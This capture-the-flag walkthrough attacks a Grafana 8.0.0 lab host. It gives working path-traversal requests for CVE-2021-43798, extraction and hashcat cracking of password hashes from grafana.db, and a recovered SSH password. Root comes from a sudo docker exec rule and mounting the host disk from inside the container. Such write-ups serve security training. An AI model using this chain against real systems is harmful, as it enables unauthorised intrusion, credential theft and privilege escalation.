
## user.txt Walkthrough

### 1. Service Enumeration

Run an initial scan with Nmap:

```bash
sudo nmap $ip -sC -sV -Pn -p22,3000
```

**Output:**

```
Nmap scan report for 10.129.254.162
Host is up (0.044s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA)
|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA)
|_  256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519)
3000/tcp open  http    Grafana http
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Grafana
|_Requested resource was /login
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.98 seconds
```

### 2. Web Enumeration

Browse to `http://10.129.254.162:3000`, then run `ffuf` for content discovery:

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://10.129.254.162:3000/FUZZ -fc 403 -fs 0,29
```

**Discovered Paths:**

```
login                   [Status: 200, Size: 32882, Words: 2586, Lines: 300, Duration: 50ms]
api                     [Status: 401, Size: 26, Words: 1, Lines: 1, Duration: 47ms]
public                  [Status: 302, Size: 31, Words: 2, Lines: 3, Duration: 44ms]
signup                  [Status: 200, Size: 32851, Words: 2586, Lines: 300, Duration: 46ms]
org                     [Status: 302, Size: 24, Words: 2, Lines: 3, Duration: 43ms]
verify                  [Status: 200, Size: 32851, Words: 2586, Lines: 300, Duration: 47ms]
metrics                 [Status: 200, Size: 50482, Words: 1720, Lines: 706, Duration: 48ms]
api-doc                 [Status: 401, Size: 26, Words: 1, Lines: 1, Duration: 43ms]
apis                    [Status: 401, Size: 26, Words: 1, Lines: 1, Duration: 47ms]
api_test                [Status: 401, Size: 26, Words: 1, Lines: 1, Duration: 42ms]
api3                    [Status: 401, Size: 26, Words: 1, Lines: 1, Duration: 43ms]
apicache                [Status: 401, Size: 26, Words: 1, Lines: 1, Duration: 43ms]
apimage                 [Status: 401, Size: 26, Words: 1, Lines: 1, Duration: 42ms]
api4                    [Status: 401, Size: 26, Words: 1, Lines: 1, Duration: 42ms]
api2                    [Status: 401, Size: 26, Words: 1, Lines: 1, Duration: 43ms]
apility                 [Status: 401, Size: 26, Words: 1, Lines: 1, Duration: 40ms]
api_cache               [Status: 401, Size: 26, Words: 1, Lines: 1, Duration: 43ms]
apic                    [Status: 401, Size: 26, Words: 1, Lines: 1, Duration: 43ms]
api7                    [Status: 401, Size: 26, Words: 1, Lines: 1, Duration: 44ms]
apiv2                   [Status: 401, Size: 26, Words: 1, Lines: 1, Duration: 43ms]
datasources             [Status: 302, Size: 24, Words: 2, Lines: 3, Duration: 43ms]
```

### 3. Fingerprinting the Web App

Check site metadata:

```bash
whatweb http://10.129.254.162:3000
```

**Output:**

```
http://10.129.254.162:3000 [302 Found] Cookies[redirect_to], Country[RESERVED][ZZ], HttpOnly[redirect_to], IP[10.129.254.162], RedirectLocation[/login], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-XSS-Protection[1; mode=block]
```

From this, we confirm the service is **Grafana 8.0.0**, which is vulnerable to [CVE-2021-43798](https://github.com/jas502n/Grafana-CVE-2021-43798).

### 4. Exploit LFI (Local File Inclusion)

Read `/etc/passwd`:

```http
GET /public/plugins/mysql/../../../../../../../../../../../etc/passwd HTTP/1.1
Host: 10.129.254.162:3000
```

Also exfiltrate Grafana configuration and database files:

- `/etc/grafana/grafana.ini`
    
- `/var/lib/grafana/grafana.db`
    

### 5. Analyze grafana.db (SQLite)

Transfer `grafana.db` to your Kali box and explore:

```bash
sqlite3 grafana.db
.tables
.schema
SELECT * FROM user;
SELECT * FROM api_key;
SELECT * FROM data_source;
SELECT * FROM user_auth_token;
```

**Example `user` Table Output:**

```
1|0|admin|admin@localhost||7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|hLLY6QQ4Y6||1|1|0||2022-01-23 12:48:04|2022-01-23 12:48:50|0|2022-01-23 12:48:50|0
2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w||1|0|0||2022-01-23 12:49:11|2022-01-23 12:49:11|0|2012-01-23 12:49:11|0
```

### 6. Convert Grafana Hashes for Hashcat

Clone and run [grafana2hashcat](https://github.com/amandaguglieri/grafana2hashcat):

```bash
git clone https://github.com/amandaguglieri/grafana2hashcat.git
cd grafana2hashcat
```

Prepare input (`hashes.txt`):

```
7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8,YObSoLj55S
dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8,LCBhdtJWjl
```

Run the tool:

```bash
pyenv activate tooling
python grafana2hashcat.py ~/hashes.txt
```

**Output:**

```
[+] Grafana2Hashcat
[+] Reading Grafana hashes from:  /home/lala/borrar/hashes.txt
[+] Done! Read 2 hashes in total.
[+] Converting hashes...
[+] Converting hashes complete.
[*] Outfile was not declared, printing output to stdout instead.

sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=

[+] Now, you can run Hashcat with the following command, for example:

hashcat -m 10900 hashcat_hashes.txt --wordlist wordlist.txt
```

### 7. Crack the Password with Hashcat

```bash
hashcat -m 10900 hashcat_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Recovered Credential:**

```
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1
```

The admin password could not be cracked.

### 8. SSH into the Host

```bash
ssh boris@$ip
# Enter password: beautiful1
```

### 9. Capture the User Flag

```bash
cat /home/boris/user.txt
```


## root.txt

We already had access to the machine as user `boris`, having retrieved `user.txt`. Now we aim to escalate to root by abusing a Docker misconfiguration.

### 1. Enumerate `sudo` Rights

```bash
sudo -l
```

Output:

```
User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
```

This tells us that `boris` can run any `docker exec` command as root without a password, but **only** `docker exec`, not other Docker commands.


### 2. Use Grafana LFI to Leak Hostname (Docker Container ID)

From our prior Grafana LFI (CVE-2021-43798), we use the following request to read `/etc/hostname`, which reveals the container ID:

```
GET /public/plugins/mysql/../../../../../../../../../../../etc/hostname HTTP/1.1
Host: 10.129.254.162:3000
```

Output:

```
e6ff5b1cbc85
```

This matches the container name.


### 3. Spawn a Root Shell Inside the Container

```bash
sudo /snap/bin/docker exec -u 0 -it e6ff5b1cbc85 /bin/bash
```

Now inside the container **as root**:

```bash
whoami
# root
```


### 4. Attempt Breakout from Container

Inspect mounts:

```bash
mount | grep -vE 'proc|tmpfs|sysfs|cgroup'
```

Key discovery:

```
/dev/sda1 on /etc/hostname type ext4
/dev/sda1 on /etc/hosts type ext4
```

This implies `/dev/sda1` is the **host filesystem**, and we can mount it manually:

```bash
mkdir /mnt/host
mount /dev/sda1 /mnt/host
cd /mnt/host
```

We now see the **full host filesystem**:

```bash
ls /mnt/host
# bin  boot  dev  etc  home  root  ...
```


### 5. Read the Root Flag

```bash
cd /mnt/host/root
ls -la
cat root.txt
```
